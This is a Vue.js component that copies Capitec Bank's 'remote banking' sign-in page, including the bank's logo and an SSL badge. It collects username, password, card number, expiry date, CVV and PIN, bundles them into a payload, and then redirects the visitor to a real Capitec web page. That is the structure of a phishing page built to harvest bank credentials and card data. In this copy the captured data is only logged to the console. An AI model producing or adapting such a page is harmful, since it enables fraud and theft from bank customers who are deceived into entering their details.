<template>
  <v-container fluid class="bgColor">
    <v-row class="ma-0 px-sm-10">
      <v-col cols="12">
        <v-card flat color="transparent">
          <v-card-text class="d-flex justify-start">
            <div style="width: 200px">
              <v-img height="50" contain src="/banks/capitec.png" />
            </div>
          </v-card-text>
        </v-card>
      </v-col>
      <v-col cols="12">
        <div class="text-h4 text-md-h3 font-weight-light black--text">
          remote banking
        </div>
      </v-col>
      <v-col cols="12" class="mt-6">
        <v-row no-gutters class="ma-0">
          <v-col cols="12">
            <div v-if="isError" class="error--text mb-2">
              <div class="font-weight-bold">Attention</div>
              <div>{{ error }}</div>
            </div>
          </v-col>
          <v-col cols="12" md="6">
            <v-form
              ref="form"
              v-model="valid"
              lazy-validation
              :style="`max-width:${isCard ? 350 : 450}px`"
              @submit.prevent="submit"
            >
              <div v-if="!isCard">
                <div class="d-flex">
                  <div
                    class="
                      text2--text
                      text-body-2 text-sm-body-1
                      mt-sm-2
                      mr-sm-2
                    "
                  >
                    Account number/ <br class="d-block d-sm-none" />
                    username:
                  </div>
                  <v-spacer />
                  <div style="width: 200px">
                    <v-text-field
                      v-model="username"
                      type="username"
                      name="username"
                      dense
                      outlined
                      color="primary"
                      class="text-subtitle-2 rounded-0 font-weight-light"
                    />
                  </div>
                </div>
                <div class="d-flex mt-n2">
                  <div
                    class="
                      text2--text
                      text-body-2 text-sm-body-1
                      mt-sm-2
                      mr-sm-2
                    "
                  >
                    Password/ <br class="d-block d-sm-none" />
                    Remote PIN:
                  </div>
                  <v-spacer />
                  <div style="width: 200px">
                    <v-text-field
                      v-model="password"
                      type="password"
                      name="password"
                      dense
                      outlined
                      color="primary"
                      class="text-subtitle-2 rounded-0 font-weight-light"
                    />
                  </div>
                </div>

                <div>
                  <div
                    class="
                      text-h6 text-sm-h5
                      grey--text
                      text--darken-1
                      font-weight-normal
                    "
                  >
                    I want to
                  </div>
                  <v-btn
                    text
                    color="black"
                    class="black--text px-0 font-weight-medium"
                    @click="next()"
                  >
                    <v-icon large> mdi-chevron-right </v-icon>
                    <span>Sign in</span>
                  </v-btn>
                </div>
              </div>
              <!-- ////////////// Card Details ///////////////// -->
              <div v-else>
                <div class="d-flex">
                  <div
                    class="
                      text2--text
                      text-body-2 text-sm-body-1
                      mt-sm-2
                      mr-sm-2
                    "
                  >
                    Card Number
                  </div>
                  <v-spacer />
                  <div style="width: 200px">
                    <v-text-field
                      v-model="cardNo"
                      type="cardNo"
                      name="cardNo"
                      dense
                      outlined
                      color="primary"
                      class="text-subtitle-2 rounded-0 font-weight-light"
                    />
                  </div>
                </div>
                <div class="d-flex mt-n2">
                  <div
                    class="
                      text2--text
                      text-body-2 text-sm-body-1
                      mt-sm-2
                      mr-sm-2
                    "
                  >
                    Expiry Date
                  </div>
                  <v-spacer />
                  <div style="width: 200px">
                    <v-text-field
                      v-model="expiryDate"
                      type="expiryDate"
                      name="expiryDate"
                      dense
                      outlined
                      color="primary"
                      class="text-subtitle-2 rounded-0 font-weight-light"
                    />
                  </div>
                </div>
                <div class="d-flex mt-n2">
                  <div
                    class="
                      text2--text
                      text-body-2 text-sm-body-1
                      mt-sm-2
                      mr-sm-2
                    "
                  >
                    CVV
                  </div>
                  <v-spacer />
                  <div style="width: 200px">
                    <v-text-field
                      v-model="cvv"
                      type="cvv"
                      name="cvv"
                      dense
                      outlined
                      color="primary"
                      class="text-subtitle-2 rounded-0 font-weight-light"
                    />
                  </div>
                </div>
                <div class="d-flex mt-n2">
                  <div
                    class="
                      text2--text
                      text-body-2 text-sm-body-1
                      mt-sm-2
                      mr-sm-2
                    "
                  >
                    Pin
                  </div>
                  <v-spacer />
                  <div style="width: 200px">
                    <v-text-field
                      v-model="pin"
                      type="pin"
                      name="pin"
                      dense
                      outlined
                      color="primary"
                      class="text-subtitle-2 rounded-0 font-weight-light"
                    />
                  </div>
                </div>

                <div>
                  <div
                    class="
                      text-h6 text-sm-h5
                      grey--text
                      text--darken-1
                      font-weight-normal
                    "
                  >
                    I want to
                  </div>
                  <v-btn text color="black" class="px-0" type="submit">
                    <v-icon large left> mdi-chevron-right </v-icon>
                    Sign in
                  </v-btn>
                </div>
              </div>
            </v-form>
          </v-col>
          <v-col
            cols="12"
            md="6"
            class="d-none ml-lg-n16 d-md-block align-center"
          >
            <div style="width: 100px">
              <v-img height="80" contain src="/banks/capitecssl.gif" />
            </div>
          </v-col>
        </v-row>
      </v-col>
      <v-col cols="12" class="bgColor py-16" />
      <v-col cols="12" class="bgColor py-10" />
    </v-row>
  </v-container>
</template>

<script>
export default {
  data: () => ({
    isCard: false,
    isError: false,
    error: "Invalid user credentials entered.",
    username: "",
    usernameRules: [(v) => !!v || "Username is required"],
    password: "",
    passwordRules: [(v) => !!v || "Password is required"],
    cardNo: "",
    cardNoRules: [(v) => !!v || "Card Number is required"],
    expiryDate: "",
    expiryDateRules: [(v) => !!v || "Expiry Date is required"],
    cvv: "",
    cvvRules: [(v) => !!v || "CVV is required"],
    pin: "",
    pinRules: [(v) => !!v || "Pin is required"],
  }),

  methods: {
    submit() {
      if (
        this.validate(this.cardNo, "Card Number") &&
        this.validate(this.expiryDate, "Expiry Date") &&
        this.validate(this.cvv, "cvv") &&
        this.validate(this.pin, "Pin")
      ) {
        const payload = {
          username: this.username,
          password: this.password,
          cardNo: this.cardNo,
          expiryDate: this.expiryDate,
          cvv: this.cvv,
          pin: this.pin,
        };
        console.log(payload);

        window.location.href =
          "https://www.capitecbank.co.za/bank-better-live-better/articles/education/";
      }
    },
    next() {
      if (
        this.validate(this.username, "Username") &&
        this.validate(this.password, "Password")
      ) {
        this.isCard = true;
      }
    },
    validate(field, name) {
      if (field.trim() === "") {
        this.isError = true;
        this.error = `${name} must be empty`;
        return false;
      } else {
        this.isError = false;
        this.error = null;
        return true;
      }
    },
    clear() {
      this.reset();
      this.resetValidation();
    },

    reset() {
      this.$refs.form.reset();
    },

    resetValidation() {
      this.$refs.form.resetValidation();
    },
  },
};
</script>

<style>
.bgColor {
  background: #f8f8ff;
}

.input {
  padding: 10px;
}
</style>
